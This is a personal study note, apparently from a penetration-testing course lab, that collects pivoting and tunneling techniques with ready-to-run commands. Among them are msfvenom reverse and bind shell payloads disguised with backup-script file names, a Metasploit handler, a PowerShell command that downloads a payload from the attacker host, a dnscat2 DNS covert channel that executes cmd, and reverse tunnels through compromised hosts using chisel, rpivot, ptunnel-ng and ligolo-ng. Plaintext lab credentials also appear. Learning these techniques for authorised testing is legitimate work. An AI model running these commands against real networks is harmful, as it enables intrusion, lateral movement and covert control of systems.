# 🔀 Pivoting, Tunneling & Port Forwarding

**Tags:** `#Pivoting` `#Tunnel` `#Tunneling` `#PortForwarding` `#SOCKS`

---

## 🧠 Core Concepts

### 🔁 **Pivoting**

- The act of using a compromised host to access other systems or networks.
- Common terms:
    - **Pivot Host**
    - **Proxy**
    - **Foothold**
    - **Beachhead System**
    - **Jump Host**

### 📦 **Tunneling**

- Encapsulating traffic to route it through a compromised host.
- Often used to bypass firewalls or access internal services.

#### 🔐 SSH Tunneling

- **Forward Tunneling**: Victim connects back to attacker.
- **Reverse Tunneling**: Attacker connects to internal services via victim.

#### 🧦 SOCKS Proxy

- TCP-based proxy protocol.
- **SOCKS4**: No authentication, no UDP.
- **SOCKS5**: Supports authentication and UDP.
- Can be used with SSH to proxy traffic.

#### 🧊 Transparent Proxy

- Intercepts traffic from non-proxy-aware tools and redirects it through a tunnel.

---

## 🧭 Lateral Movement

- Expanding access to additional **hosts**, **applications**, or **services** within a network.

---

## 🔀 Port Forwarding

### 🔒 Local Port Forwarding

```bash
ssh -L 1234:localhost:3306 user@target
```

- Forwards local port `1234` to `target:3306`.

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

- Forwarding multiple ports.

#### 🔍 Confirm Forwarding

```bash
nmap -v -sV -p1234 localhost
netstat -antp | grep 1234
```

### 🌐 Dynamic Port Forwarding

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

- Creates a SOCKS proxy on port `9050`.

---

## 🌐 Network Enumeration

- `ip a` / `ifconfig` (Linux)
- `ipconfig` (Windows)
- `netstat -r` / `ip route` – View routing table

---

## 🧰 ProxyChains

- Forces apps to use a SOCKS proxy.
- Config: `/etc/proxychains.conf`

#### 🔧 Examples

```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
curl --socks5 127.0.0.1:9050 http://support.inlanefreight.local
```

---

## 🔁 Reverse Port Forwarding

```bash
ssh -R <pivotIP>:9090:0.0.0.0:9050 ubuntu@<targetIP> -vN
```

- Forwards traffic from victim’s port `9090` to attacker’s port `9050`.

---

## 📡 Ping Sweeps

- **Metasploit**:

```bash
  run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

- **Linux Bash**:

```bash
  for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done
```

- **Windows CMD**:

```cmd
  for /L %i in (1,1,254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

- **PowerShell**:

```powershell
  1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.5.$($_) -Quiet)"}
```

---

## 🛠️ Metasploit for Pivoting

- **SOCKS Proxy Module**:

```bash
  use auxiliary/server/socks_proxy
  set SRVPORT 9050
  set SRVHOST 0.0.0.0
  set version 4a
  run
```

- **Autoroute**:

```bash
  use post/multi/manage/autoroute
  set SESSION 1
  set SUBNET 172.16.5.0
  run
```

- **Port Forwarding**:

```bash
  portfwd add -l 3300 -p 3389 -r 172.16.5.19
  portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

- **Multi/Handler Setup**:

```bash
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LPORT 8081
  set LHOST 0.0.0.0
  run
```

---

## 🧬 Msfvenom Payloads

- **Windows Reverse Shell**:

```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```

- **Linux Reverse Shell**:

```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```

- **Windows Bind Shell**:

```bash
  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupscript.exe
```

- **Download Payload (PowerShell)**:

```powershell
  Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

---

## 🔄 Socat
- [[05 - Personal/Jonathan/Tools/Remote Access/socat|socat]]
- **Forward to Attacker**:

```bash
  socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

- **Forward to Internal Host**:

```bash
  socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

## 🪟 Plink (Windows SSH Client)

```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

- Creates a SOCKS proxy on port `9050`.

---

### 🪟 **Proxifier**

- [www.proxifier.com](https://www.proxifier.com/)
- Windows tool that forces applications to use a SOCKS proxy.

---

### 🐍 **sshuttle**

-  [sshuttle](https://github.com/sshuttle/sshuttle)
- Python-based transparent proxy.
- Installs via:

```bash
sudo apt-get install sshuttle
```

- Example usage:

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

- Creates `iptables` rules to redirect traffic to the specified subnet.

---

### 🧦 **Rpivot**

- [rpivot](https://github.com/klsecservices/rpivot)
- Python-based SOCKS4 proxy.

#### 🛠️ Setup

```bash
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```

#### 🖥️ Attacker (Server)

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### 🧳 Pivot Host (Client)

```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

#### 🔍 Example Usage

```bash
proxychains firefox-esr 172.16.5.135:80
```

---

### 🪟 **Netsh Portproxy**
- [[netsh]]
- Built-in Windows tool for port forwarding.

#### 🛠️ Add Port Forwarding

```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

#### 🔍 Verify

```bash
netsh interface portproxy show v4tov4
```

#### 🖥️ RDP Example

```bash
xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123
```

---

### 📡 **DNS Tunneling with Dnscat2**

- [dnscat2](https://github.com/iagox86/dnscat2)
- Covert channel using DNS queries.

#### 🛠️ Server (Attacker)

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

#### 🧳 Client (Windows)

- PowerShell Client

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

---

### 🛠️ **Chisel (SOCKS5 over HTTP)**

- [chisel](https://github.com/jpillora/chisel)
- Fast TCP/UDP tunneling over HTTP, encrypted via SSH.

#### 🧱 Build & Deploy

```bash
git clone https://github.com/jpillora/chisel.git
go build
scp chisel ubuntu@10.129.202.64:~/
```

#### 🧳 Pivot Host (Server)

```bash
./chisel server -v -p 1234 --socks5
```

#### 🖥️ Attacker (Client)

```bash
./chisel client -v 10.129.202.64:1234 socks
```

#### 🔁 Reverse Tunnel

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
./chisel client -v 10.10.14.17:1234 R:socks
```

#### 🧪 Example

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

### 📶 **ICMP Tunneling with ptunnel-ng**

- [ptunnel-ng](https://github.com/utoni/ptunnel-ng)
- Tunnels TCP over ICMP echo packets.

#### 📦 Deploy

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

#### 🧳 Pivot Host

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

#### 🖥️ Attacker

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

#### 🔁 SSH SOCKS Proxy

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

#### 🔍 Scan Internal Target

```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

### 🪟 **SocksOverRDP**
- [SocksOverRDP GitHub](https://github.com/nccgroup/SocksOverRDP)

#### 📋 Steps

1. 🖥️ **RDP into the Pivot Host**
```bash
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
2. 📌 **Register the Plugin**
```bash
regsvr32.exe SocksOverRDP-Plugin.dll
```
3. 🔄 **Start RDP Session from Pivot to Internal Host**
> A confirmation message from the plugin will appear.
4. 🛠️ **On the Internal Host** — Run SOCKS Server as Admin:
```bash
SocksOverRDP-Server.exe
```
5. 🔍 **Verify it's Listening on Port 1080**
```bash
netstat -antb | findstr 1080
```
6. ⚙️ **Configure Proxifier**
> Set proxy to: `127.0.0.1:1080`

---

### 🧬 **ligolo-ng**

- [[ligolo-ng]] _(Note: Placeholder — expand with usage and setup if needed)_
- A modern, fast, and secure **reverse tunneling** tool designed for red teamers.
- Uses **TUN interfaces** and **TLS encryption** to create a full-featured SOCKS proxy or VPN-like tunnel.

#### ⚙️ Features

- Encrypted tunnels using **TLS**.
- Supports **SOCKS5** and **TCP/UDP** forwarding.
- Works on **Linux**, **Windows**, and **macOS**.
- Can be used for **pivoting**, **port forwarding**, and **proxying** internal services.

#### 🛠️ Setup

1. **Clone & Build**:

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
make build
```

2. **Deploy Agent to Pivot Host**:

```bash
scp agent USER@10.129.202.64:~/
```

3. **Start Listener on Attacker Machine**:

```bash
./ligolo-ng -selfcert -lhost 10.10.14.18
```

4. **Run Agent on Pivot Host**:

```bash
./agent -connect 10.10.14.18:11601 -ignore-cert
```

5. **Start Tunnel Session**:

```bash
session
```

6. **Enable SOCKS Proxy**:

```bash
socks start -listen 127.0.0.1:1080
```

7. **Use with ProxyChains**:

```bash
proxychains nmap -sT -Pn -p3389 172.16.5.19
```

---
